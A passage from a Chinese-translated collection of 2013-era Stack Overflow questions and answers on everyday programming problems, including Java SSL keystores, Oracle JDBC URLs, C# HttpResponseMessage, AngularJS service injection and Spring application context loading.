> 时间：2013-04-17T18:52:41.267

这是我发现的最简单的方法：

```
 {{ form_widget(form.field, {value: 1 } ) }} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-11T08:02:22.733

我认为你不需要这样做。创建表单时，您可以传递您的实体（包括数据）。您的下拉列表将选择数据。请参阅此代码，例如：

```
$em = $this->getDoctrine()->getManager();
$entity = $em->getRepository('YourBundle:YourEntity')->find($id);
if (!$entity) {
    throw $this->createNotFoundException('Unable to find entity.');
}

$editForm = $this->createForm(new YourFormType(), $entity); 
//in entity goes with all data and your selectbox will be selected with correct data 
return $this->render('YourBundle:YourController:edit.html.twig', array(
    'entity'      => $entity,
    'edit_form'   => $editForm->createView(),
)); 
```

或尝试这样做！通过“值”更改“选择”

```
{{ form_widget(form.warehouse, {'value': warehouse_id } ) }} 
```

请告诉我你是否解决了你的疑问

# java - Passbook APN 证书失败 (Java/Groovy)

> ID：15936173
> 
> 赞同：0
> 
> 时间：2013-04-10T20:53:50.107
> 
> 标签：java, groovy, notifications, push, passbook

我正在尝试在 Grails 中编写一个服务来发送推送通知以更新存折通行证。我已经到了可以测试连接到 APN 服务器的代码是否正常工作的地步，但是，我似乎无法使用 Java SSLSocket 方法建立连接。

连接的第一部分有效，我从服务器接收证书并在证书链中找到受信任的证书；但是，在那之后，由于某种原因，我的客户端证书/证书链从未发送到服务器，因此连接失败。

我似乎无法弄清楚为什么没有发送证书，我使用以下代码来设置密钥库：

```
void setupSSLPropertiesForConnection() {
    System.setProperty("javax.net.ssl.keyStore", "superSecretFile.p12")
    System.setProperty("javax.net.ssl.keyStorePassword", "superSecretPassword")
    System.setProperty("javax.net.ssl.keyStoreType", "PKCS12")

    System.setProperty("javax.net.ssl.trustStore", "trustStoreFile")
    System.setProperty("javax.net.ssl.trustStorePassword", "trustStorePassword")
    System.setProperty("javax.protocol.handler.pkgs", "com.sun.net.ssl.internal.www.protocol")
} 
```

然后尝试连接到 APN 服务器：

```
setupSSLPropertiesForConnection()
SSLSocketFactory factory = (SSLSocketFactory)SSLSocketFactory.getDefault()
SSLSocket socket = (SSLSocket)factory.createSocket("gateway.push.apple.com", 2195) 
```

我使用 Java 的 keytool 查看了 PKCS12 文件，只有一个别名，其中包含我的存折证书（证书、WWDR、Apple 证书）的整个证书链，所以我不知道为什么证书不是请求时发送。任何关于它为什么不发送证书信息的帮助将不胜感激！

**编辑：**另外，如果有人要发布一种从用于签署通行证的 .p12 或仅从从 iOS 开发门户下载的存折证书获取 SSL 证书的方法，这是已知的工作，那么我可能能够工作从那倒过来找出我做错了什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T22:12:30.753

现在我觉得很傻，显然我的客户端 PKCS12 文件和信任库文件的文件名都是错误的，但是在使用 System.setProperty 设置密钥库和信任库时，如果找不到或打开文件，它不会抛出任何错误.

我尝试更改我的代码，以便从使用 TrustManagerFactory 和 KeyManagerFactory 创建的 SSLContext 创建 SSLSocketFactory，当我尝试它时，它抛出了 FileNotFoundError。现在它似乎至少工作了。叹。

# jdbc - 如何在 Weblogic 中为连接池正确指定 URL

> ID：15936174
> 
> 赞同：3
> 
> 时间：2013-04-10T20:53:53.093
> 
> 标签：jdbc, weblogic, datasource, connection-pooling

我将如何使用以下信息创建连接池。我想我在 URL 中弄错了。

```
(DESCRIPTION =
    (ADDRESS = (PROTOCOL = TCP)(HOST = myDB01.com)(PORT = 1821))
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = myDB.com)
    )
  ) 
```

我尝试在 URL 中指定以下内容，但是没有用

```
jdbc:oracle:thin:@myDB01.com:1821:myDB.com 
```

这是我在服务器启动日志中看到的异常

```
oracle.net.ns.NetException: Listener refused the connection with the following error:
ORA-12505, TNS:listener does not currently know of SID given in connect descriptor 
```

注意：我能够从 Oracle 客户端成功连接到数据库。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-10T20:58:05.767

您需要使用这种格式：

```
jdbc:oracle:thin:[USER/PASSWORD]@//[HOST][:PORT]/SERVICE 
```

[http://www.orafaq.com/wiki/JDBC](http://www.orafaq.com/wiki/JDBC)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-05-23T13:28:14.680

Oracle weblogic 10.3 版在其控制台应用程序中有一个错误。当它为您的数据库生成 URL 时，它是使用以下格式生成的：

jdbc:oracle:thin:@HOST:PORT:SERVICE

但是控制台应该使用这种格式生成：

jdbc:oracle:thin:@HOST:PORT/SERVICE

注意 PORT 和 SERVICE 之间的字符。

# python - 源代码后应用程序不起作用

> ID：15936175
> 
> 赞同：1
> 
> 时间：2013-04-10T20:53:57.443
> 
> 标签：python, tkinter, py2app, platypus

我有一个正在运行的 Python+Tkinter 程序，它是一个字典创建器。但是，当我将源代码转换为应用程序时，程序本身不会创建它应该创建的文件。我对编程很陌生，如果您能帮助我，我将不胜感激。到目前为止，我已经尝试过 py2app 和 platypus 都给出了相同的结果。

这是代码：

```
#!/usr/bin/env python
from Tkinter import *
import tkMessageBox
import itertools
import string

def done():
    l=list()
    if check_a.get() == True:
        l.append(string.lowercase)

    if check_A.get() == True:
        l.append(string.uppercase)

    if check_0.get() == True:
        l.append(string.digits)
    l=''.join(l)
    n=entryvar.get()
    with open("b.txt","a+") as f:
        for i in itertools.product(l,repeat=n):
            f.write(''.join(list(i)))
            f.write('\n')
        f.close()

generater=Tk()
generater.title("Generater")
generater.geometry("450x300+200+200")

mainlabel=Label(generater).pack()

entryvar=IntVar()
entry=Entry(generater, textvariable=entryvar).pack()

check_a=BooleanVar()
check_A=BooleanVar()
check_0=BooleanVar()
checkBox_a=Checkbutton(generater, variable=check_a, text="a-z").pack()
checkBox_A=Checkbutton(generater, variable=check_A, text="A-Z").pack()
checkBox_0=Checkbutton(generater, variable=check_0, text="0-9").pack()

DoneButton=Button(generater, text="Done", command=done).pack()

generater.mainloop() 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-11T09:47:18.200

当您启动由 py2app 创建的应用程序时，当前工作目录将更改为应用程序包内的“Contents/Resources”文件夹。因为您的脚本创建了一个相对于当前工作目录的文件，所以它最终位于应用程序中。

（例如 myapp.app/Contents/Resources/b.txt）

# android - listview.setOnItemClickListener 和 row.setOnClickListener 的区别

> ID：15936176
> 
> 赞同：5
> 
> 时间：2013-04-10T20:54:00.833
> 
> 标签：android, listview, onclick, android-arrayadapter

我正在创建一个自定义数组适配器，我现在想实现一个处理单击视图的函数。我有两个选择，但我想知道性能/工作速度是否有差异？

选项 1，在 arrayAdapter 本身中：

```
row.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub

            }
        }); 
```

选项 2，来自主活动：

```
listView.setAdapter(adapter);
        listView.setOnItemClickListener(new OnItemClickListener() {

            @Override
            public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
                    long arg3) {
                // TODO Auto-generated method stub

            }

        }); 
```

还是它们完全一样？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-10T21:02:25.563

> 还是它们完全一样？

在第一种方法中，您将为每一行创建自己的侦听器 eq，您有 100 行，因此您将拥有 100 个根本不好的侦听器。在第二种方法中，您将为整个 ListView 创建一个侦听器。

```
android.widget.AdapterView.OnItemClickListener
android.view.View.OnClickListener 
```

你怎么看，首先是更舒适和直接指定用于处理像 ListView 这样的适配器小部件。此外，通常推荐和使用这种方法。

您可以通过 onItemClick() 方法的参数与每一行建立联系，并且代码更易于阅读，也更清晰。

# c# - 从 HttpResponseMessage 获取内容/消息

> ID：15936180
> 
> 赞同：217
> 
> 时间：2013-04-10T20:54:09.193
> 
> 标签：c#, windows-8, windows-store-apps

我正在尝试获取 HttpResponseMessage 的内容。它应该是：`{"message":"Action '' does not exist!","success":false}`，但我不知道如何从 HttpResponseMessage 中获取它。

```
HttpClient httpClient = new HttpClient();
HttpResponseMessage response = await httpClient.GetAsync("http://****?action=");
txtBlock.Text = Convert.ToString(response); //wrong! 
```

在这种情况下 txtBlock 将具有价值：

```
StatusCode: 200, ReasonPhrase: 'OK', Version: 1.1, Content: System.Net.Http.StreamContent, Headers:
{
  Vary: Accept-Encoding
  Keep-Alive: timeout=15, max=100
  Connection: Keep-Alive
  Date: Wed, 10 Apr 2013 20:46:37 GMT
  Server: Apache/2.2.16
  Server: (Debian)
  X-Powered-By: PHP/5.3.3-7+squeeze14
  Content-Length: 55
  Content-Type: text/html
} 
```

* * *

## 回答 #1

> 赞同：463
> 
> 时间：2015-04-07T10:47:17.987

我认为最简单的方法就是将最后一行更改为

```
txtBlock.Text = await response.Content.ReadAsStringAsync(); //right! 
```

这样你就不需要引入任何流阅读器，也不需要任何扩展方法。

* * *

## 回答 #2

> 赞同：77
> 
> 时间：2013-04-10T20:58:22.500

您需要调用[GetResponse()](http://msdn.microsoft.com/en-us/library/system.net.httpwebrequest.getresponse.aspx)。

```
Stream receiveStream = response.GetResponseStream ();
StreamReader readStream = new StreamReader (receiveStream, Encoding.UTF8);
txtBlock.Text = readStream.ReadToEnd(); 
```

* * *

## 回答 #3

> 赞同：43
> 
> 时间：2015-01-13T15:54:58.670

试试这个，你可以像这样创建一个扩展方法：

```
 public static string ContentToString(this HttpContent httpContent)
    {
        var readAsStringAsync = httpContent.ReadAsStringAsync();
        return readAsStringAsync.Result;
    } 
```

然后，简单地调用扩展方法：

```
txtBlock.Text = response.Content.ContentToString(); 
```

我希望这对你有帮助;-)

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2017-02-06T17:15:03.447

如果您想将其转换为特定类型（例如在测试中），您可以使用[ReadAsAsync](https://msdn.microsoft.com/en-us/library/system.net.http.httpcontentextensions.readasasync(v=vs.118).aspx#M:System.Net.Http.HttpContentExtensions.ReadAsAsync%28System.Net.Http.HttpContent,System.Type%29)扩展方法：

```
object yourTypeInstance = await response.Content.ReadAsAsync(typeof(YourType)); 
```

或以下同步代码：

```
object yourTypeInstance = response.Content.ReadAsAsync(typeof(YourType)).Result; 
```

更新：还有[ReadAsAsync<>](https://msdn.microsoft.com/en-us/library/system.net.http.httpcontentextensions.readasasync(v=vs.118).aspx#M:System.Net.Http.HttpContentExtensions.ReadAsAsync%60%601%28System.Net.Http.HttpContent%29)的通用选项，它返回特定类型的实例而不是对象声明的实例：

```
YourType yourTypeInstance = await response.Content.ReadAsAsync<YourType>(); 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2018-10-26T12:11:31.397

通过 rudivonstaden 的回答

```
txtBlock.Text = await response.Content.ReadAsStringAsync(); 
```

但如果您不想使方法异步，您可以使用

```
txtBlock.Text = response.Content.ReadAsStringAsync();
txtBlock.Text.Wait(); 
```

Wait() 这很重要，因为我们正在执行异步操作，我们必须等待任务完成才能继续。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2020-01-21T17:44:43.197

我建议的快速答案是：

`response.Result.Content.ReadAsStringAsync().Result`

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2020-01-16T15:24:41.087

我认为下图有助于那些需要`T`作为返回类型的人。

[![在此处输入图像描述](https://i.stack.imgur.com/JGYfC.gif)](https://i.stack.imgur.com/JGYfC.gif)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-09-05T08:04:53.820

您可以使用以下`GetStringAsync`方法：

```
var uri = new Uri("http://yoururlhere");
var response = await client.GetStringAsync(uri); 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2022-02-20T15:16:29.083

截至 2022 年 2 月的更新答案：

```
var stream = httpResponseMessage.Content.ReadAsStream();
var ms = new MemoryStream();
stream.CopyTo(ms);
var responseBodyBytes = ms.ToArray(); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-09-01T16:00:34.413

使用块：

```
using System;
using System.Net;
using System.Net.Http; 
```

此函数将创建新的 HttpClient 对象，将 http-method 设置为 GET，将请求 URL 设置为函数“Url”字符串参数，并将这些参数应用于 HttpRequestMessage 对象（定义 SendAsync 方法的设置）。最后一行：函数向指定的 url 发送异步 GET http 请求，等待响应消息的 .Result 属性（只是完整响应对象：headers + body/content），获取该完整响应的 .Content 属性（请求正文，没有 http headers），将 ReadAsStringAsync() 方法应用于该内容（这也是某种特殊类型的对象），最后，再次使用 .Result 属性等待此异步任务完成，以获得最终结果字符串，然后返回此字符串作为我们的函数返回。

```
static string GetHttpContentAsString(string Url)
    {   
        HttpClient HttpClient = new HttpClient();
        HttpRequestMessage RequestMessage = new HttpRequestMessage(HttpMethod.Get, Url);
        return HttpClient.SendAsync(RequestMessage).Result.Content.ReadAsStringAsync().Result;
    } 
```

较短的版本，它不显示我们的 http 请求的完整“转换”路径，并使用 HttpClient 对象的 GetStringAsync 方法。函数只是创建 HttpClient 类的新实例（一个 HttpClient 对象），使用 GetStringAsync 方法将我们的 http 请求的响应正文（内容）作为异步任务结果\承诺，然后使用该异步任务结果的 .Result 属性获取最终字符串，然后简单地将这个字符串作为函数返回返回。

```
static string GetStringSync(string Url)
    {
        HttpClient HttpClient = new HttpClient();
        return HttpClient.GetStringAsync(Url).Result;
    } 
```

用法：

```
const string url1 = "https://microsoft.com";
const string url2 = "https://stackoverflow.com";

ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; /*sets TLC protocol version explicitly to modern version, otherwise C# could not make http requests to some httpS sites, such as https://microsoft.com*/

Console.WriteLine(GetHttpContentAsString(url1)); /*gets microsoft main page html*/
Console.ReadLine(); /*makes some pause before second request. press enter to make second request*/
Console.WriteLine(GetStringSync(url2)); /*gets stackoverflow main page html*/
Console.ReadLine(); /*press enter to finish*/ 
```

完整代码：

[![在此处输入图像描述](https://i.stack.imgur.com/iNk0S.png)](https://i.stack.imgur.com/iNk0S.png)

# jquery - 在一个简单的 jQuery 库中关闭并恢复为原始图像？

> ID：15936181
> 
> 赞同：0
> 
> 时间：2013-04-10T20:54:15.857
> 
> 标签：jquery

我正在使用[Papermashup.com](http://papermashup.com/simple-jquery-gallery/)的简单 jQuery 库，需要帮助扩展它的功能。我目前有 4 个缩略图和 1 个主图像。但是，我希望能够恢复到原始图像，而无需原始图像的额外缩略图。如果以及当您单击另一个缩略图时，是否可以恢复为原始状态？

HTML：

```
<div class="main"><img src="main.jpg"></div>

<div class="thumbs">
   <a class="t" href="main-lrg.jpg" rel="1"><img src="main-1.jpg"></a>
   <a class="t" href="main-lrg.jpg" rel="2"><img src="main-1.jpg"></a>
   <a class="t" href="main-lrg.jpg" rel="3"><img src="main-1.jpg"></a>
   <a class="t" href="main-lrg.jpg" rel="4"><img src="main-1.jpg"></a>
</div> 
```

JS：

```
$(function() {
    $('.t').click(function() {
        var image = $(this).attr('rel');
        $('.main').hide();
        $('.main').fadeIn('fast');
        $('.main').html('<img src="' + image + '">');
        return false;
    });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:32:07.293

在 DOM 加载时获取原始图像`src`属性，以便您对其进行引用。然后，当您想再次显示原始图像时，您只需将主图像的`src`属性设置回原始图像即可。例如，如果你有一个 ID 为“close”的按钮，它应该显示原始图像，它看起来像这样：

```
$(function() {
    var original = $('.main img').attr('src');

    $('#close').click(function() {
        $('.main img').attr('src', original);
        $(this).hide();
    });

    $('.t').click(function() {
        var image = $(this).attr('rel');
        $('.main').hide();
        $('.main').fadeIn('fast');
        $('.main').html('<img src="' + image + '">');
        $('#close').show();
        return false;
    });
}); 
```

# ruby - 使用 REXML 保留空格/换行符

> ID：15936182
> 
> 赞同：0
> 
> 时间：2013-04-10T20:54:20.757
> 
> 标签：ruby, xml, whitespace, rexml

我正在使用 Ruby 1.9.3 和 REXML 来解析 XML 文档，进行一些更改（添加/减少），然后重新输出文件。在这个文件中有一个如下所示的块：

```
<someElement>
  some.namespace.something1=somevalue1
  some.namespace.something2=somevalue2
  some.namespace.something3=somevalue3
</someElement> 
```

问题是在重写文件后，这个块总是看起来像这样：

```
<someElement>
  some.namespace.something1=somevalue1
  some.namespace.something2=somevalue2 some.namespace.something3=somevalue3
</someElement> 
```

第二个值之后的换行符（但绝不是第一个值！）已经丢失并变成了一个空格。稍后，我无法控制或影响的其他一些代码将读取此文件并根据这些换行符正确解析内容。一般来说，在这种情况下，我会使用 CDATA 来保留空格，但这不是一个选项，因为稍后解析此数据的代码并不期待 - 必须完全保留此元素的内部文本原样.

我的读/写代码如下所示：

```
xmlFile = File.open(myFile)
contents = xmlFile.read
xmlDoc = REXML::Document.new(contents, { :respect_whitespace => :all })
xmlFile.close

{perform some tasks}

out = ""
xmlDoc.write(out, 2)
File.open(filePath, "w"){|file| file.puts(out)} 
```

我正在寻找一种在使用 REXML 以这种方式读取/写入文件时保留元素之间文本空白的方法。我已经在 stackoverflow 上阅读了有关此主题的许多其他问题，但没有一个可以完全复制这种情况。欢迎任何想法或建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:08:26.790

`indent`我通过删除（第二个）参数来获得正确的行为`Document.write()`：

```
#xmlDoc.write(out, 2)
xmlDoc.write(out) 
```

`Document.write()`根据我[对文档](http://ruby-doc.org/stdlib-1.9.3/libdoc/rexml/rdoc/REXML/Document.html#method-i-write)的阅读，这似乎是一个错误，但如果你真的不需要设置缩进，那么关闭它应该可以解决你的问题。

# c# - 字符串包含任何字符数组

> ID：15936184
> 
> 赞同：0
> 
> 时间：2013-04-10T20:54:22.647
> 
> 标签：c#, arrays

我的问题是我想检查一个字符串是否包含我设置的三个字符数组中的一个或多个，并且在大多数情况下我让它工作但由于一些奇怪的原因一行不想工作而我不想'不知道我做错了什么。

这三个数组是

a = af 小写字母

b = AF 大写字母

c = 1-6 个数字

该程序适用于：小写，大写，数字，小写+数字，大写+数字和小写+大写+数字，但不起作用的是小写+大写`(c.Any(x.Contains) == false && a.Any(x.Contains) == true && b.Any(x.Contains) == true)`

代码：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApplication2
{
public partial class Form1 : Form
{
    Char[] a = { 'a', 'b', 'c', 'd', 'e', 'f' };
    Char[] b = { 'A', 'B', 'C', 'D', 'E', 'F' };
    Char[] c = { '1', '2', '3', '4', '5', '6' };

    public Form1()
    {
        InitializeComponent();
    }

    private void button1_Click(object sender, EventArgs e)
    {
        textBox1.Text = "";
        if(textBox2.Text != "")
        {
            Char[] x = textBox2.Text.ToCharArray();
            if (c.Any(x.Contains) == true && a.Any(x.Contains) ==false && b.Any(x.Contains)==false)
            {
                textBox1.Text = "num";
            }
            else if (b.Any(x.Contains) == true && c.Any(x.Contains) == false && a.Any(x.Contains) ==false)
            {
                textBox1.Text = "cap";
            }
            else if (a.Any(x.Contains) == true && c.Any(x.Contains) == false && c.Any(x.Contains) == false)
            {
                textBox1.Text = "low";
            }
            else if (c.Any(x.Contains) == false && a.Any(x.Contains) == true && b.Any(x.Contains) == true)
            {
                    textBox1.Text = "low&cap";
            }
            else if (a.Any(x.Contains) == true && c.Any(x.Contains) == true && b.Any(x.Contains) == false)
            {
                textBox1.Text = "low&num";
            }
            else if (b.Any(x.Contains) == true && c.Any(x.Contains) == true && a.Any(x.Contains) == false)
            {
                textBox1.Text = "cap&num";
            }
            else if (a.Any(x.Contains) == true && b.Any(x.Contains) == true && c.Any(x.Contains) == true)
            {
                textBox1.Text = "cap&num&low";
            }

        }
    }

    private void Form1_Load(object sender, EventArgs e)
    {

    }
}
} 
```

谢谢转发

编辑

没关系，我只是想通了该程序首先找到了仅小写的选项，并没有费心去进一步寻找...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:03:09.883

像这样的东西？

```
Char[] lower = { 'a', 'b', 'c', 'd', 'e', 'f' };
Char[] upper = { 'A', 'B', 'C', 'D', 'E', 'F' };
Char[] number = { '1', '2', '3', '4', '5', '6' };

List<string> types = new List<string>();
if(lower.Any(l=>x.Contains(l))
    types.Add("low");
if(upper.Any(u=>x.Contains(u))
    types.Add("cap");
if(number.Any(n=>x.Contains(n))
    types.Add("num");

textbox1.Text = string.Join("&",types); 
```

请注意，您不必将输入字符串转换为`char`数组 -`string.Contains()`也可以。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:12:31.500

您是否考虑过编写扩展程序？他们做得很好！

```
private void button1_Click(object sender, EventArgs e)
{
    textBox1.Text = textBox2.Text.MyContains();
} 
```

当然，您可以将该扩展名更改为适合您的名称。

扩展需要进入一个静态类，并且可以像这样简单：

```
public static class Extensions {

  private static Char[] a = { 'a', 'b', 'c', 'd', 'e', 'f' };
  private static Char[] b = { 'A', 'B', 'C', 'D', 'E', 'F' };
  private static Char[] c = { '1', '2', '3', '4', '5', '6' };

  public static string MyContain(this string value) {
    Char[] x = value.ToCharArray();
    string result = null;
    if (a.Any(l => x.Contains(l))) {
      result = "low";
    }
    if (b.Any(c => x.Contains(c))) {
      result = String.IsNullOrEmpty(result) ? "cap" : result + "&cap";
    }
    if (c.Any(n => x.Contains(n))) {
      result = String.IsNullOrEmpty(result) ? "num" : result + "&num";
    }
    return result;
  }

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T21:07:34.197

测试“低”的行是错误的，你测试了两次数组 c
更改为

```
else if (c.Any(x.Contains) == false && a.Any(x.Contains) == true && b.Any(x.Contains) == true) 
```

该错误始终捕获具有混合大小写字母的字符串，并且永远不会达到“low&cap”的else if。

# java - mac 在 /usr/bin/java 中用 java 7 替换 java 6

> ID：15936185
> 
> 赞同：1
> 
> 时间：2013-04-10T20:54:23.057
> 
> 标签：java, macos, installation

1.  当我在终端输入“whereis java”时说：/usr/bin/java 当我输入“java -version”时它说“1.6.0_43”......

2.  当我在系统偏好设置中打开 Java 控制面板时，我能看到的唯一版本是 Java 1.7.0_17，其位置位于“/Library/Internet Plug-ins/JavaAppletPlugin.plugin/Contents/Home/bin/java”。我没有“Java 首选项”面板，让我可以选择优先使用哪个版本。

很明显，当使用互联网浏览器时，将使用 java 7，而我在终端中编译 Java 时使用 Java 6。但是我怎样才能摆脱 Java 6？有没有办法可以在 /usr/bin/java 下安装 Java 7？

顺便说一句，我不确定如何使用 .profile 文件。我可以修改这个文件，这样当我在终端时我仍然可以使用 java 7 吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-04-11T23:03:40.307

从 Oracle 下载 Java SE 7u4。

安装它。

此版本与浏览网站时下载的版本不同。

虽然它真的是有线的......

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-11-11T17:33:38.447

与此同时，7u4 版本不再是最新版本，而且充满了安全漏洞！

我的解决方案（我从评论中提供的链接中获得）是安装当前版本的 Java 并开始`/Applications/Utilities/Java-Settings`显示当前安装的 Java 版本并允许设置默认版本。将当前版本拖到顶部。然后`/usr/bin/java`指向正确的版本。

# iphone - AVAudioRecorder 停止方法 iOS 6.1.x 问题

> ID：15936186
> 
> 赞同：1
> 
> 时间：2013-04-10T20:54:24.017
> 
> 标签：iphone, ios, ipad, avaudiorecorder

在我的应用程序中，当我想停止录音机时，它适用于 iOS 5 和 6.0.x

`[self.audioRecorder stop];`

调用方法 `audioRecorderDidFinishRecording`

但在 iOS 6.1.x 中，没有。

该应用程序卡住了，并且没有调用`audioRecorderDidFinishRecording`

有任何想法吗？请

# java - 未找到 applicationContext 类路径

> ID：15936187
> 
> 赞同：5
> 
> 时间：2013-04-10T20:54:26.127
> 
> 标签：java, spring, tomcat, filter, shiro

出于某种原因（shiro 过滤器），我将应用程序上下文文件保存在 WEB-INF 文件夹中。当我运行 tomcat 时一切正常，但是当我尝试使用以下命令从控制器获取应用程序上下文时：

```
context = new ClassPathXmlApplicationContext(fileContext); 
```

我总是收到这个例外：

```
IOException parsing XML document from class path resource [applicationContext.xml]; nested exception is java.io.FileNotFoundException: class path resource [applicationContext.xml] cannot be opened because it does not exist 
```

似乎在 ecplise 下我无法将 WEB-INF 包含在类路径下。我在stackoverflow中查看了很多问题，但我还没有找到解决方案。

如果我将 applicationContext.xml 文件移动到 src/main/java 文件夹下，我可以获取上下文，但是定义到 web.xml 文件中的 shiro 文件无法看到在 applicationContext 文件下定义的 shiro bean（我加倍检查并且 bean 工作正常）。如何告诉 web.xml 从 src/main/java 获取内容？或者，我怎样才能到达 applicationContext.xml

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:13:44.380

WEB-INF 不在您的 CLASSPATH 中。WEB-INF/classes 是。那么为什么不将它放在源文件夹中并打包应用程序呢？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-11T03:00:53.480

不要`ApplicationContext`在控制器中创建实例。春天`DispatcherServlet`已经为你创造了一个。您需要做的就是使用`@Autowired`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-11T06:19:05.150

采用

```
context = new FileSystemXmlApplicationContext(fileContext); 
```

代替

```
context = new ClassPathXmlApplicationContext(fileContext); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-11T09:05:52.040

问题已解决，移动 WEB-INF/classes 下的所有配置文件并添加前缀类路径：

```
<import resource="classpath:spring-data.xml"/> 
```

感谢大家的帮助！我非常感谢！

干杯，安德里亚

# .net - Azure 移动服务脚本触发

> ID：15936188
> 
> 赞同：0
> 
> 时间：2013-04-10T20:54:32.237
> 
> 标签：.net, push-notification, azure-mobile-services

所以我知道没有用于移动服务推送通知机制的 HTTP API，我唯一的希望是我可以使用来自脚本的推送通知，但是我想知道即使没有从移动客户端 sdk 插入脚本也会触发，假设我从 .NET 服务器向数据库插入数据，它会触发我的脚本吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T22:27:42.473

如果您使用 Azure 移动服务 REST 接口插入数据（即，通过对 进行 HTTP 调用`https://your-service.azure-mobile.net/tables/your-table-name`），那么是的，脚本将被调用。如果直接将数据插入到 SQL Azure 数据库中，则不，不会调用该脚本。

# angularjs - 将资源放入控制器

> ID：15936189
> 
> 赞同：1
> 
> 时间：2013-04-10T20:54:37.527
> 
> 标签：angularjs, yeoman

我无法在控制器中获取我的服务。这个项目在最新的 yeoman 下，它为我创建模板并在构建时合并文件。

更改某些内容时，角度会停止工作，并且控制台中不会显示任何错误。

错误信息是：

```
ReferenceError: UserService is not defined
at new <anonymous> (http://localhost:9000/scripts/controllers/people.js:5:25
at invoke (http://localhost:9000/components/angular/angular.js:2864:28)
at Object.instantiate (http://localhost:9000/components/angular/angular.js:2874:23)
at http://localhost:9000/components/angular/angular.js:4759:24
at <error: illegal access>
at Object.Scope.$broadcast (http://localhost:9000/components/angular/angular.js:8261:28)
at http://localhost:9000/components/angular/angular.js:7417:26
at wrappedCallback (http://localhost:9000/components/angular/angular.js:6797:59)
at wrappedCallback (http://localhost:9000/components/angular/angular.js:6797:59)
at http://localhost:9000/components/angular/angular.js:6834:26 
```

应用程序.js：

```
'use strict';

angular.module('jellybeanApp', ['jellybeanApp.Service'])
.config(function ($routeProvider, $locationProvider) {
$locationProvider.html5Mode(true);

$routeProvider
  .when('/', {
    templateUrl: 'views/main.html',
    controller: 'HomeController'
  })
  .when('/people', {
    templateUrl: 'views/people.html',
    controller: 'PeopleCtrl'
  })
  .otherwise({
    redirectTo: '/'
  });
 }); 
```

我的服务：

```
'use strict';

angular.module('jellybeanApp.Service', ['ngResource'])
  .factory('UserServices', function ($rootScope, $resource, $routeParams, $location) {
return {
  users : function() {
    return $resource('notimportant',
      {action: 'user', callback: 'JSON_CALLBACK'},
      {
        get: {method: 'JSONP', params: {UserId: $routeParams.UserId}},
        query: {method: 'JSONP'},
        create: {method: 'POST'}
      });
  }
};
}); 
```

控制器 ：

```
'use strict';

angular.module('jellybeanApp')
 .controller('PeopleCtrl', function ($scope, UserServices) {
$scope.userResult = UserService.users().query();

}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:00:17.177

您正在注入`UserServices`您的控制器，但随后尝试访问`UserService`. 看起来像一个简单的错字？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:34:11.737

在旁注中，我会放弃

```
 {action: 'user', callback: 'JSON_CALLBACK'},
  {
    ...
    create: {method: 'POST'}
  }); 
```

并且只使用内置的 UserService.users.$save() *编辑错字

# css - 如何更改 Slickgrid 编辑器按钮 css 类（或任何动态创建的按钮）？

> ID：15936196
> 
> 赞同：0
> 
> 时间：2013-04-10T20:55:02.370
> 
> 标签：css, button, slickgrid

我正在尝试更改 Slickgrid 中的编辑器按钮（保存、取消）css。如何将 css 类应用于按钮项，如下所示？

```
<body>
    <div><button>save</button></div>
</body> 
```

我试图将单元格双击事件绑定到此代码：

```
$("body button").addClass("custom_button"); 
```

它不起作用，因为：

1.  在呈现按钮之前调用事件
2.  所有其他 < div >< button > 项目都会受到影响。

提前致谢！

* * *

编辑：

1.  出于某种原因，我不能使用标签而是类来进行 CSS 样式设置。
2.  如果您之前没有使用过 slickgrid，则此按钮仅在您双击网格单元后才会出现。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:47:46.897

如果您想为正文中的所有按钮设置样式，则可以使用 CSS。将您的`custom_button`类中的样式放入 CSS 选择器中，在`head`您的页面中放入如下内容：

```
<style type="text/css">
    body button {
        /* styles from custom_button class go here */
    }
</style> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:05:40.173

给按钮一个id。

```
<button id="saveButton">save</button> 
```

这样就可以直接调用

```
$("saveButton").addClass("custom_button"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T23:40:56.740

只需修改 slickgrid.editor.js 并应用该类。

# html - HTML根文件夹？

> ID：15936201
> 
> 赞同：8
> 
> 时间：2013-04-10T20:55:05.980
> 
> 标签：html

